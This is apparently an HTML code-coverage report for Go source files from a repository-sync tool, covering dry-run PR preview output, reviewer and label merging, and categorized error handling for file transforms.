        _, _ = fmt.Fprintln(d.writer, "‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ")
}</span>

// Content prints content with proper formatting
func (d *DryRunOutput) Content(line string) <span class="cov8" title="1">{
        if strings.TrimSpace(line) == "" </span><span class="cov8" title="1">{
                _, _ = fmt.Fprintln(d.writer, "‚îÇ")
        }</span> else<span class="cov8" title="1"> {
                if len(line) &gt; 60 </span><span class="cov8" title="1">{
                        _, _ = fmt.Fprintf(d.writer, "‚îÇ %s\n", line[:57]+"...")
                }</span> else<span class="cov8" title="1"> {
                        _, _ = fmt.Fprintf(d.writer, "‚îÇ %s\n", line)
                }</span>
        }
}

// Footer prints the closing border
func (d *DryRunOutput) Footer() <span class="cov8" title="1">{
        _, _ = fmt.Fprintln(d.writer, "‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ")
}</span>

// Info prints an informational message
func (d *DryRunOutput) Info(message string) <span class="cov8" title="1">{
        _, _ = fmt.Fprintf(d.writer, "   %s\n", message)
}</span>

// Warning prints a warning message
func (d *DryRunOutput) Warning(message string) <span class="cov8" title="1">{
        _, _ = fmt.Fprintf(d.writer, "‚ö†Ô∏è  %s\n", message)
}</span>

// Success prints a success message
func (d *DryRunOutput) Success(message string) <span class="cov8" title="1">{
        _, _ = fmt.Fprintf(d.writer, "‚úÖ %s\n", message)
}</span>

// FileChange represents a change to a file
type FileChange struct {
        Path            string
        Content         []byte
        OriginalContent []byte
        IsNew           bool
}

// showDryRunCommitInfo displays commit information preview for dry-run
func (rs *RepositorySync) showDryRunCommitInfo(changedFiles []FileChange) <span class="cov8" title="1">{
        rs.logger.Debug("Showing dry-run commit preview")

        commitMsg := rs.generateCommitMessage(changedFiles)
        out := NewDryRunOutput(nil)

        out.Header("üìã COMMIT PREVIEW")
        out.Field("Message", commitMsg)
        out.Field("Files", fmt.Sprintf("%d changed", len(changedFiles)))

        // Show file summary
        fileNames := make([]string, 0, len(changedFiles))
        for _, file := range changedFiles </span><span class="cov8" title="1">{
                fileNames = append(fileNames, file.Path)
        }</span>
        <span class="cov8" title="1">if len(fileNames) &lt;= 3 </span><span class="cov8" title="1">{
                out.Field("", strings.Join(fileNames, ", "))
        }</span> else<span class="cov0" title="0"> {
                out.Field("", fmt.Sprintf("%s, ... and %d more",
                        strings.Join(fileNames[:3], ", "), len(fileNames)-3))
        }</span>
        <span class="cov8" title="1">out.Footer()</span>
}

// showDryRunFileChanges displays file changes in a readable format
func (rs *RepositorySync) showDryRunFileChanges(changedFiles []FileChange) <span class="cov8" title="1">{
        rs.logger.WithField("changed_files", len(changedFiles)).Debug("Showing file changes preview")

        out := NewDryRunOutput(nil)
        _, _ = fmt.Fprintln(out.writer, "üìÑ FILE CHANGES:")

        for _, file := range changedFiles </span><span class="cov8" title="1">{
                status := "modified"
                icon := "üìù"
                if file.IsNew </span><span class="cov0" title="0">{
                        status = "added"
                        icon = "‚ú®"
                }</span>

                // Calculate size info if content is available
                <span class="cov8" title="1">sizeInfo := ""
                if len(file.Content) &gt; 0 </span><span class="cov8" title="1">{
                        if file.IsNew </span><span class="cov0" title="0">{
                                sizeInfo = fmt.Sprintf(" (+%d bytes)", len(file.Content))
                        }</span> else<span class="cov8" title="1"> if len(file.OriginalContent) &gt; 0 </span><span class="cov8" title="1">{
                                sizeDiff := len(file.Content) - len(file.OriginalContent)
                                if sizeDiff &gt; 0 </span><span class="cov8" title="1">{
                                        sizeInfo = fmt.Sprintf(" (+%d bytes)", sizeDiff)
                                }</span> else<span class="cov0" title="0"> if sizeDiff &lt; 0 </span><span class="cov0" title="0">{
                                        sizeInfo = fmt.Sprintf(" (%d bytes)", sizeDiff)
                                }</span>
                        }
                }

                <span class="cov8" title="1">out.Info(fmt.Sprintf("%s %s (%s)%s", icon, file.Path, status, sizeInfo))</span>
        }
}

// formatAssignmentList formats a slice of strings into a comma-separated list or returns "none"
func (rs *RepositorySync) formatAssignmentList(items []string) string <span class="cov8" title="1">{
        if len(items) == 0 </span><span class="cov8" title="1">{
                return "none"
        }</span>
        <span class="cov0" title="0">return strings.Join(items, ", ")</span>
}

// formatReviewersWithFiltering formats reviewers list showing which ones will be filtered
func (rs *RepositorySync) formatReviewersWithFiltering(reviewers []string, currentUserLogin string) string <span class="cov8" title="1">{
        if len(reviewers) == 0 </span><span class="cov8" title="1">{
                return "none"
        }</span>

        <span class="cov8" title="1">formatted := make([]string, 0, len(reviewers))
        for _, reviewer := range reviewers </span><span class="cov8" title="1">{
                if currentUserLogin != "" &amp;&amp; reviewer == currentUserLogin </span><span class="cov8" title="1">{
                        formatted = append(formatted, fmt.Sprintf("%s (author - will be filtered)", reviewer))
                }</span> else<span class="cov8" title="1"> {
                        formatted = append(formatted, reviewer)
                }</span>
        }
        <span class="cov8" title="1">return strings.Join(formatted, ", ")</span>
}

// showDryRunPRPreview displays full PR preview with formatting
func (rs *RepositorySync) showDryRunPRPreview(ctx context.Context, branchName, commitSHA string, changedFiles []FileChange) <span class="cov8" title="1">{
        rs.logger.WithFields(logrus.Fields{
                "branch": branchName,
                "files":  len(changedFiles),
        }).Debug("Showing PR preview")

        title := rs.generatePRTitle()
        body := rs.generatePRBody(commitSHA, changedFiles)
        out := NewDryRunOutput(nil)

        out.Header("DRY-RUN: Pull Request Preview")
        out.Field("Repository", rs.target.Repo)
        out.Field("Branch", branchName)
        out.Separator()
        out.Field("Title", title)
        out.Separator()

        // Get current user for reviewer filtering display
        var currentUserLogin string
        rs.TrackAPIRequest()
        currentUser, err := rs.engine.gh.GetCurrentUser(ctx)
        if err != nil </span><span class="cov0" title="0">{
                rs.logger.WithError(err).Debug("Failed to get current user for dry-run display")
        }</span> else<span class="cov8" title="1"> if currentUser != nil </span><span class="cov8" title="1">{
                currentUserLogin = currentUser.Login
        }</span>

        // Show PR assignment details
        <span class="cov8" title="1">out.Content("Assignment Details:")
        out.Content(fmt.Sprintf("‚Ä¢ Assignees: %s", rs.formatAssignmentList(rs.getPRAssignees())))
        out.Content(fmt.Sprintf("‚Ä¢ Labels: %s", rs.formatAssignmentList(rs.getPRLabels())))
        out.Content(fmt.Sprintf("‚Ä¢ Reviewers: %s", rs.formatReviewersWithFiltering(rs.getPRReviewers(), currentUserLogin)))
        out.Content(fmt.Sprintf("‚Ä¢ Team Reviewers: %s", rs.formatAssignmentList(rs.getPRTeamReviewers())))
        out.Separator()

        // Split body into lines and display with proper formatting
        bodyLines := strings.Split(body, "\n")
        for _, line := range bodyLines </span><span class="cov8" title="1">{
                out.Content(line)
        }</span>

        <span class="cov8" title="1">out.Footer()</span>
}

// mergeUniqueStrings merges two string slices, removing duplicates while preserving order
// Items from the first slice take precedence in ordering
func (rs *RepositorySync) mergeUniqueStrings(slice1, slice2 []string) []string <span class="cov8" title="1">{
        if len(slice1) == 0 &amp;&amp; len(slice2) == 0 </span><span class="cov8" title="1">{
                return nil
        }</span>

        <span class="cov8" title="1">seen := make(map[string]bool)
        result := make([]string, 0, len(slice1)+len(slice2))

        // Add items from first slice
        for _, item := range slice1 </span><span class="cov8" title="1">{
                if item != "" &amp;&amp; !seen[item] </span><span class="cov8" title="1">{
                        result = append(result, item)
                        seen[item] = true
                }</span>
        }

        // Add items from second slice that haven't been seen
        <span class="cov8" title="1">for _, item := range slice2 </span><span class="cov8" title="1">{
                if item != "" &amp;&amp; !seen[item] </span><span class="cov8" title="1">{
                        result = append(result, item)
                        seen[item] = true
                }</span>
        }

        <span class="cov8" title="1">if len(result) == 0 </span><span class="cov8" title="1">{
                return nil
        }</span>
        <span class="cov8" title="1">return result</span>
}

// getPRAssignees returns the assignees to use for PRs, merging global + target assignments
func (rs *RepositorySync) getPRAssignees() []string <span class="cov8" title="1">{
        var global []string
        var defaults []string

        if rs.engine.currentGroup != nil </span><span class="cov0" title="0">{
                global = rs.engine.currentGroup.Global.PRAssignees
                defaults = rs.engine.currentGroup.Defaults.PRAssignees
        }</span> else<span class="cov8" title="1"> {
                // Get from the first group (since we have a single group in temporary config)
                if len(rs.engine.config.Groups) &gt; 0 </span><span class="cov8" title="1">{
                        global = rs.engine.config.Groups[0].Global.PRAssignees
                        defaults = rs.engine.config.Groups[0].Defaults.PRAssignees
                }</span>
        }

        <span class="cov8" title="1">target := rs.target.PRAssignees

        // Merge global + target (unique)
        combined := rs.mergeUniqueStrings(global, target)

        // Fall back to defaults if no assignments
        if len(combined) == 0 </span><span class="cov8" title="1">{
                return defaults
        }</span>
        <span class="cov8" title="1">return combined</span>
}

// getPRReviewers returns the reviewers to use for PRs, merging global + target assignments
func (rs *RepositorySync) getPRReviewers() []string <span class="cov8" title="1">{
        var global []string
        var defaults []string

        if rs.engine.currentGroup != nil </span><span class="cov0" title="0">{
                global = rs.engine.currentGroup.Global.PRReviewers
                defaults = rs.engine.currentGroup.Defaults.PRReviewers
        }</span> else<span class="cov8" title="1"> {
                // Get from the first group (since we have a single group in temporary config)
                if len(rs.engine.config.Groups) &gt; 0 </span><span class="cov8" title="1">{
                        global = rs.engine.config.Groups[0].Global.PRReviewers
                        defaults = rs.engine.config.Groups[0].Defaults.PRReviewers
                }</span>
        }

        <span class="cov8" title="1">target := rs.target.PRReviewers

        // Merge global + target (unique)
        combined := rs.mergeUniqueStrings(global, target)

        // Fall back to defaults if no assignments
        if len(combined) == 0 </span><span class="cov8" title="1">{
                return defaults
        }</span>
        <span class="cov8" title="1">return combined</span>
}

// getPRLabels returns the labels to use for PRs, merging global + target assignments
func (rs *RepositorySync) getPRLabels() []string <span class="cov8" title="1">{
        var global []string
        var defaults []string

        if rs.engine.currentGroup != nil </span><span class="cov0" title="0">{
                global = rs.engine.currentGroup.Global.PRLabels
                defaults = rs.engine.currentGroup.Defaults.PRLabels
        }</span> else<span class="cov8" title="1"> {
                // Get from the first group (since we have a single group in temporary config)
                if len(rs.engine.config.Groups) &gt; 0 </span><span class="cov8" title="1">{
                        global = rs.engine.config.Groups[0].Global.PRLabels
                        defaults = rs.engine.config.Groups[0].Defaults.PRLabels
                }</span>
        }

        <span class="cov8" title="1">target := rs.target.PRLabels

        // Merge global + target (unique)
        combined := rs.mergeUniqueStrings(global, target)

        // Fall back to defaults if no assignments
        if len(combined) == 0 </span><span class="cov8" title="1">{
                return defaults
        }</span>
        <span class="cov8" title="1">return combined</span>
}

// getPRTeamReviewers returns the team reviewers to use for PRs, merging global + target assignments
func (rs *RepositorySync) getPRTeamReviewers() []string <span class="cov8" title="1">{
        var global []string
        var defaults []string

        if rs.engine.currentGroup != nil </span><span class="cov0" title="0">{
                global = rs.engine.currentGroup.Global.PRTeamReviewers
                defaults = rs.engine.currentGroup.Defaults.PRTeamReviewers
        }</span> else<span class="cov8" title="1"> {
                // Get from the first group (since we have a single group in temporary config)
                if len(rs.engine.config.Groups) &gt; 0 </span><span class="cov8" title="1">{
                        global = rs.engine.config.Groups[0].Global.PRTeamReviewers
                        defaults = rs.engine.config.Groups[0].Defaults.PRTeamReviewers
                }</span>
        }

        <span class="cov8" title="1">target := rs.target.PRTeamReviewers

        // Merge global + target (unique)
        combined := rs.mergeUniqueStrings(global, target)

        // Fall back to defaults if no assignments
        if len(combined) == 0 </span><span class="cov8" title="1">{
                return defaults
        }</span>
        <span class="cov8" title="1">return combined</span>
}
</pre>

		<pre class="file" id="file71" style="display: none">// Package sync provides specialized error handling for transform operations
package sync

import (
        "context"
        "errors"
        "fmt"
        "path/filepath"
        "slices"
        "strings"
        "time"

        internalerrors "github.com/mrz1836/go-broadcast/internal/errors"
)

// TransformErrorCategory categorizes different types of transform errors
type TransformErrorCategory string

const (
        // CategoryBinaryFile indicates errors related to binary file processing
        CategoryBinaryFile TransformErrorCategory = "binary_file"

        // CategoryTemplateParse indicates template parsing errors
        CategoryTemplateParse TransformErrorCategory = "template_parse"

        // CategoryVariableSubstitution indicates variable substitution errors
        CategoryVariableSubstitution TransformErrorCategory = "variable_substitution"

        // CategoryRepoNameFormat indicates repository name format errors
        CategoryRepoNameFormat TransformErrorCategory = "repo_name_format"

        // CategoryGenericTransform indicates generic transform errors
        CategoryGenericTransform TransformErrorCategory = "generic_transform"

        // CategoryFileSystem indicates file system related errors
        CategoryFileSystem TransformErrorCategory = "file_system"

        // CategoryTimeout indicates timeout errors during transformation
        CategoryTimeout TransformErrorCategory = "timeout"

        // CategoryContext indicates context cancellation errors
        CategoryContext TransformErrorCategory = "context"
)

// TransformError provides detailed error context for transform operations
type TransformError struct {
        // Underlying error
        err error

        // File being transformed
        filePath string

        // Source and target repositories
        sourceRepo string
        targetRepo string

        // Transform type information
        transformType string

        // Directory operation context
        isFromDirectory bool
        relativePath    string

        // Error categorization
        category TransformErrorCategory

        // Recovery information
        recoverable bool
        retryable   bool

        // Timing information
        timestamp time.Time
        duration  time.Duration

        // Additional context
        metadata map[string]interface{}
}

// Error implements the error interface
func (te *TransformError) Error() string <span class="cov8" title="1">{
        var parts []string

        // Base error message
        if te.err != nil </span><span class="cov8" title="1">{
                parts = append(parts, fmt.Sprintf("transform failed: %s", te.err.Error()))
        }</span> else<span class="cov0" title="0"> {
                parts = append(parts, "transform failed")
        }</span>

        // Add file context
        <span class="cov8" title="1">if te.filePath != "" </span><span class="cov8" title="1">{
                if te.isFromDirectory &amp;&amp; te.relativePath != "" </span><span class="cov8" title="1">{
                        parts = append(parts, fmt.Sprintf("file: %s (relative: %s)", te.filePath, te.relativePath))
                }</span> else<span class="cov8" title="1"> {
                        parts = append(parts, fmt.Sprintf("file: %s", te.filePath))
                }</span>
        }

        // Add repository context
        <span class="cov8" title="1">if te.sourceRepo != "" &amp;&amp; te.targetRepo != "" </span><span class="cov8" title="1">{
                parts = append(parts, fmt.Sprintf("repos: %s -&gt; %s", te.sourceRepo, te.targetRepo))
        }</span>

        // Add transform type
        <span class="cov8" title="1">if te.transformType != "" </span><span class="cov8" title="1">{
                parts = append(parts, fmt.Sprintf("transform: %s", te.transformType))
        }</span>

        // Add category
        <span class="cov8" title="1">parts = append(parts, fmt.Sprintf("category: %s", te.category))

        return strings.Join(parts, " | ")</span>
}

// Unwrap returns the underlying error for error.Is and error.As
func (te *TransformError) Unwrap() error <span class="cov8" title="1">{
        return te.err
}</span>

// Is implements error comparison for errors.Is
func (te *TransformError) Is(target error) bool <span class="cov8" title="1">{
        var targetTE *TransformError
        if errors.As(target, &amp;targetTE) </span><span class="cov8" title="1">{
                return te.category == targetTE.category
        }</span>
        <span class="cov8" title="1">return errors.Is(te.err, target)</span>
}

// NewTransformError creates a new transform error with comprehensive context
func NewTransformError(
        err error,
        filePath string,
        sourceRepo, targetRepo string,
        transformType string,
) *TransformError <span class="cov8" title="1">{
        return &amp;TransformError{
                err:           err,
                filePath:      filePath,
                sourceRepo:    sourceRepo,
                targetRepo:    targetRepo,
                transformType: transformType,
                category:      categorizeError(err),
                recoverable:   isRecoverableError(err),
                retryable:     isRetryableError(err),
                timestamp:     time.Now(),
                metadata:      make(map[string]interface{}),
        }
}</span>

// NewDirectoryTransformError creates a transform error for directory operations
func NewDirectoryTransformError(
        err error,
        filePath, relativePath string,
        sourceRepo, targetRepo string,
        transformType string,
) *TransformError <span class="cov8" title="1">{
        te := NewTransformError(err, filePath, sourceRepo, targetRepo, transformType)
        te.isFromDirectory = true
        te.relativePath = relativePath
        return te
}</span>

// WithDuration adds timing information to the error
func (te *TransformError) WithDuration(duration time.Duration) *TransformError <span class="cov8" title="1">{
        te.duration = duration
        return te
}</span>

// WithMetadata adds metadata to the error
func (te *TransformError) WithMetadata(key string, value interface{}) *TransformError <span class="cov8" title="1">{
        te.metadata[key] = value
        return te
}</span>

// GetCategory returns the error category
func (te *TransformError) GetCategory() TransformErrorCategory <span class="cov8" title="1">{
        return te.category
}</span>

// IsRecoverable returns whether the error allows for fallback strategies
func (te *TransformError) IsRecoverable() bool <span class="cov8" title="1">{
        return te.recoverable
}</span>

// ShouldRetry returns whether the operation should be retried
func (te *TransformError) ShouldRetry() bool <span class="cov8" title="1">{
        return te.retryable
}</span>

// GetFilePath returns the file path being transformed
func (te *TransformError) GetFilePath() string <span class="cov8" title="1">{
        return te.filePath
}</span>

// GetRelativePath returns the relative path within directory operations
func (te *TransformError) GetRelativePath() string <span class="cov8" title="1">{
        return te.relativePath
}</span>

// IsFromDirectory returns whether this error is from a directory operation
func (te *TransformError) IsFromDirectory() bool <span class="cov8" title="1">{
        return te.isFromDirectory
}</span>

// GetSourceRepo returns the source repository
func (te *TransformError) GetSourceRepo() string <span class="cov8" title="1">{
        return te.sourceRepo
}</span>

// GetTargetRepo returns the target repository
func (te *TransformError) GetTargetRepo() string <span class="cov8" title="1">{
        return te.targetRepo
}</span>

// GetTransformType returns the transform type
func (te *TransformError) GetTransformType() string <span class="cov8" title="1">{
        return te.transformType
}</span>

// GetTimestamp returns when the error occurred
func (te *TransformError) GetTimestamp() time.Time <span class="cov8" title="1">{
        return te.timestamp
}</span>

// GetDuration returns how long the transform took before failing
func (te *TransformError) GetDuration() time.Duration <span class="cov8" title="1">{
        return te.duration
}</span>

// GetMetadata returns the error metadata
func (te *TransformError) GetMetadata() map[string]interface{} <span class="cov8" title="1">{
        return te.metadata
}</span>

// categorizeError determines the error category based on the underlying error
func categorizeError(err error) TransformErrorCategory <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return CategoryGenericTransform
        }</span>

        <span class="cov8" title="1">errStr := strings.ToLower(err.Error())

        // Check for context errors first
        if errors.Is(err, context.Canceled) </span><span class="cov8" title="1">{
                return CategoryContext
        }</span>
        <span class="cov8" title="1">if errors.Is(err, context.DeadlineExceeded) </span><span class="cov8" title="1">{
                return CategoryTimeout
        }</span>

        // Check for specific error types
        <span class="cov8" title="1">if errors.Is(err, internalerrors.ErrTransformNotFound) </span><span class="cov8" title="1">{
                return CategoryGenericTransform
        }</span>

        // Check for binary file indicators
        <span class="cov8" title="1">if strings.Contains(errStr, "binary") || strings.Contains(errStr, "non-text") </span><span class="cov8" title="1">{
                return CategoryBinaryFile
        }</span>

        // Check for template parsing errors
        <span class="cov8" title="1">if strings.Contains(errStr, "template") || strings.Contains(errStr, "parse") </span><span class="cov8" title="1">{
                return CategoryTemplateParse
        }</span>

        // Check for variable substitution errors
        <span class="cov8" title="1">if strings.Contains(errStr, "variable") || strings.Contains(errStr, "substitution") </span><span class="cov8" title="1">{
                return CategoryVariableSubstitution
        }</span>

        // Check for repository format errors
        <span class="cov8" title="1">if strings.Contains(errStr, "repository format") || strings.Contains(errStr, "invalid repo") </span><span class="cov8" title="1">{
                return CategoryRepoNameFormat
        }</span>

        // Check for file system errors
        <span class="cov8" title="1">if strings.Contains(errStr, "no such file") || strings.Contains(errStr, "permission denied") ||
                strings.Contains(errStr, "file system") || strings.Contains(errStr, "path") </span><span class="cov8" title="1">{
                return CategoryFileSystem
        }</span>

        // Check for timeout-related errors
        <span class="cov8" title="1">if strings.Contains(errStr, "timeout") || strings.Contains(errStr, "deadline") </span><span class="cov8" title="1">{
                return CategoryTimeout
        }</span>

        <span class="cov8" title="1">return CategoryGenericTransform</span>
}

// isRecoverableError determines if an error allows for fallback strategies
func isRecoverableError(err error) bool <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return true
        }</span>

        // Non-recoverable error categories
        <span class="cov8" title="1">nonRecoverableCategories := []TransformErrorCategory{
                CategoryFileSystem,
                CategoryContext,
        }

        category := categorizeError(err)
        return !slices.Contains(nonRecoverableCategories, category)</span>
}

// isRetryableError determines if an operation should be retried
func isRetryableError(err error) bool <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return false
        }</span>

        // Retryable error categories
        <span class="cov8" title="1">retryableCategories := []TransformErrorCategory{
                CategoryTimeout,
                CategoryFileSystem, // Some file system errors are transient
        }

        category := categorizeError(err)

        // Context cancellation is not retryable
        if errors.Is(err, context.Canceled) </span><span class="cov8" title="1">{
                return false
        }</span>

        <span class="cov8" title="1">return slices.Contains(retryableCategories, category)</span>
}

// TransformCollectionError aggregates multiple transform errors from directory operations
type TransformCollectionError struct {
        errors      []*TransformError
        successful  int
        failed      int
        recoverable int
        retryable   int
}

// NewTransformCollectionError creates a new error collection
func NewTransformCollectionError() *TransformCollectionError <span class="cov8" title="1">{
        return &amp;TransformCollectionError{
                errors: make([]*TransformError, 0),
        }
}</span>

// Add adds a transform error to the collection
func (tec *TransformCollectionError) Add(err *TransformError) <span class="cov8" title="1">{
        if err == nil </span><span class="cov0" title="0">{
                return
        }</span>

        <span class="cov8" title="1">tec.errors = append(tec.errors, err)
        tec.failed++

        if err.IsRecoverable() </span><span class="cov8" title="1">{
                tec.recoverable++
        }</span>

        <span class="cov8" title="1">if err.ShouldRetry() </span><span class="cov8" title="1">{
                tec.retryable++
        }</span>
}

// AddSuccess records a successful transform
func (tec *TransformCollectionError) AddSuccess() <span class="cov8" title="1">{
        tec.successful++
}</span>

// GetErrors returns all errors in the collection
func (tec *TransformCollectionError) GetErrors() []*TransformError <span class="cov8" title="1">{
        return slices.Clone(tec.errors)
}</span>

// GetErrorsByCategory returns errors filtered by category
func (tec *TransformCollectionError) GetErrorsByCategory(category TransformErrorCategory) []*TransformError <span class="cov8" title="1">{
        var filtered []*TransformError
        for _, err := range tec.errors </span><span class="cov8" title="1">{
                if err.GetCategory() == category </span><span class="cov8" title="1">{
                        filtered = append(filtered, err)
                }</span>
        }
        <span class="cov8" title="1">return filtered</span>
}

// HasErrors returns whether the collection contains any errors
func (tec *TransformCollectionError) HasErrors() bool <span class="cov8" title="1">{
        return len(tec.errors) &gt; 0
}</span>

// Error implements the error interface for the collection
func (tec *TransformCollectionError) Error() string <span class="cov8" title="1">{
        if !tec.HasErrors() </span><span class="cov8" title="1">{
                return "no transform errors"
        }</span>

        <span class="cov8" title="1">categories := make(map[TransformErrorCategory]int)
        for _, err := range tec.errors </span><span class="cov8" title="1">{
                categories[err.GetCategory()]++
        }</span>

        <span class="cov8" title="1">parts := make([]string, 0, len(categories))
        for category, count := range categories </span><span class="cov8" title="1">{
                parts = append(parts, fmt.Sprintf("%s: %d", category, count))
        }</span>

        <span class="cov8" title="1">return fmt.Sprintf("transform errors (%d total, %d successful, %d recoverable, %d retryable): %s",
                tec.failed, tec.successful, tec.recoverable, tec.retryable, strings.Join(parts, ", "))</span>
}

// GetSummary returns a summary of the error collection
func (tec *TransformCollectionError) GetSummary() TransformErrorSummary <span class="cov8" title="1">{
        categories := make(map[TransformErrorCategory]int)
        files := make(map[string]int)

        for _, err := range tec.errors </span><span class="cov8" title="1">{
                categories[err.GetCategory()]++

                filePath := err.GetFilePath()
                if err.IsFromDirectory() &amp;&amp; err.GetRelativePath() != "" </span><span class="cov0" title="0">{
                        filePath = err.GetRelativePath()
                }</span>
                <span class="cov8" title="1">if filePath != "" </span><span class="cov8" title="1">{
                        files[filePath]++
                }</span>
        }

        <span class="cov8" title="1">return TransformErrorSummary{
                Total:       tec.failed,
                Successful:  tec.successful,
                Recoverable: tec.recoverable,
                Retryable:   tec.retryable,
                Categories:  categories,
                FileErrors:  files,
        }</span>
}

// TransformErrorSummary provides a summary of transform errors
type TransformErrorSummary struct {
        Total       int                            `json:"total"`
        Successful  int                            `json:"successful"`
        Recoverable int                            `json:"recoverable"`
        Retryable   int                            `json:"retryable"`
        Categories  map[TransformErrorCategory]int `json:"categories"`
        FileErrors  map[string]int                 `json:"file_errors"`
}

// TransformRecoveryStrategy defines strategies for handling transform errors
type TransformRecoveryStrategy int

const (
        // RecoveryStrategyNone performs no recovery
        RecoveryStrategyNone TransformRecoveryStrategy = iota

        // RecoveryStrategyUseOriginal uses the original content without transformation
        RecoveryStrategyUseOriginal

        // RecoveryStrategySkipFile skips the file entirely
        RecoveryStrategySkipFile

        // RecoveryStrategyRetry retries the transformation
        RecoveryStrategyRetry
)

// GetRecoveryStrategy determines the appropriate recovery strategy for an error
func GetRecoveryStrategy(err *TransformError) TransformRecoveryStrategy <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return RecoveryStrategyNone
        }</span>

        // Context cancellation should not be recovered
        <span class="cov8" title="1">if err.GetCategory() == CategoryContext </span><span class="cov8" title="1">{
                return RecoveryStrategyNone
        }</span>

        // Binary files should be skipped rather than transformed
        <span class="cov8" title="1">if err.GetCategory() == CategoryBinaryFile </span><span class="cov8" title="1">{
                return RecoveryStrategySkipFile
        }</span>

        // Retryable errors should be retried first
        <span class="cov8" title="1">if err.ShouldRetry() </span><span class="cov8" title="1">{
                return RecoveryStrategyRetry
        }</span>

        // Recoverable errors can use original content
        <span class="cov8" title="1">if err.IsRecoverable() </span><span class="cov8" title="1">{
                return RecoveryStrategyUseOriginal
        }</span>

        // Non-recoverable errors should skip the file
        <span class="cov0" title="0">return RecoveryStrategySkipFile</span>
}

// ValidateTransformContext validates transform context for common error conditions
func ValidateTransformContext(filePath, sourceRepo, targetRepo string) error <span class="cov8" title="1">{
        if filePath == "" </span><span class="cov8" title="1">{
                return internalerrors.EmptyFieldError("file_path")
        }</span>

        <span class="cov8" title="1">if sourceRepo == "" </span><span class="cov8" title="1">{
                return internalerrors.EmptyFieldError("source_repo")
        }</span>

        <span class="cov8" title="1">if targetRepo == "" </span><span class="cov8" title="1">{
                return internalerrors.EmptyFieldError("target_repo")
        }</span>

        // Validate repository format
        <span class="cov8" title="1">if !isValidRepoFormat(sourceRepo) </span><span class="cov8" title="1">{
                return internalerrors.FormatError("source_repo", sourceRepo, "org/repo")
        }</span>

        <span class="cov8" title="1">if !isValidRepoFormat(targetRepo) </span><span class="cov8" title="1">{
                return internalerrors.FormatError("target_repo", targetRepo, "org/repo")
        }</span>

        // Check for path traversal
        <span class="cov8" title="1">if strings.Contains(filePath, "..") </span><span class="cov8" title="1">{
                return internalerrors.PathTraversalError(filePath)
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// isValidRepoFormat checks if a repository string follows the org/repo format
func isValidRepoFormat(repo string) bool <span class="cov8" title="1">{
        parts := strings.Split(repo, "/")
        if len(parts) != 2 </span><span class="cov8" title="1">{
                return false
        }</span>

        // Check that both parts are non-empty and don't contain invalid characters
        <span class="cov8" title="1">for _, part := range parts </span><span class="cov8" title="1">{
                if part == "" || strings.ContainsAny(part, " \t\n\r") </span><span class="cov8" title="1">{
                        return false
                }</span>
        }

        <span class="cov8" title="1">return true</span>
}

// WrapTransformError wraps a regular error as a TransformError if it isn't already
func WrapTransformError(err error, filePath, sourceRepo, targetRepo, transformType string) error <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return nil
        }</span>

        // If it's already a TransformError, return as-is
        <span class="cov8" title="1">var te *TransformError
        if errors.As(err, &amp;te) </span><span class="cov8" title="1">{
                return err
        }</span>

        // Wrap as new TransformError
        <span class="cov8" title="1">return NewTransformError(err, filePath, sourceRepo, targetRepo, transformType)</span>
}

// WrapDirectoryTransformError wraps a regular error as a directory TransformError
func WrapDirectoryTransformError(err error, filePath, relativePath, sourceRepo, targetRepo, transformType string) error <span class="cov8" title="1">{
        if err == nil </span><span class="cov8" title="1">{
                return nil
        }</span>

        // If it's already a TransformError, update directory context and return
        <span class="cov8" title="1">var te *TransformError
        if errors.As(err, &amp;te) </span><span class="cov8" title="1">{
                if !te.isFromDirectory </span><span class="cov8" title="1">{
                        te.isFromDirectory = true
                        te.relativePath = relativePath
                }</span>
                <span class="cov8" title="1">return err</span>
        }

        // Wrap as new directory TransformError
        <span class="cov8" title="1">return NewDirectoryTransformError(err, filePath, relativePath, sourceRepo, targetRepo, transformType)</span>
}

// GetFileExtension returns the file extension from a path, used for error categorization
func GetFileExtension(filePath string) string <span class="cov8" title="1">{
        return strings.ToLower(filepath.Ext(filePath))
}</span>

// IsBinaryFileExtension checks if a file extension typically indicates a binary file
func IsBinaryFileExtension(ext string) bool <span class="cov8" title="1">{
        binaryExtensions := []string{
                ".exe", ".dll", ".so", ".dylib", ".a", ".o", ".obj",
                ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico", ".svg",
                ".mp3", ".mp4", ".avi", ".mov", ".wav", ".ogg",
                ".zip", ".tar", ".gz", ".bz2", ".xz", ".7z", ".rar",
                ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
                ".class", ".jar", ".war", ".ear",
                ".woff", ".woff2", ".ttf", ".otf", ".eot",
        }

        return slices.Contains(binaryExtensions, ext)
}</span>
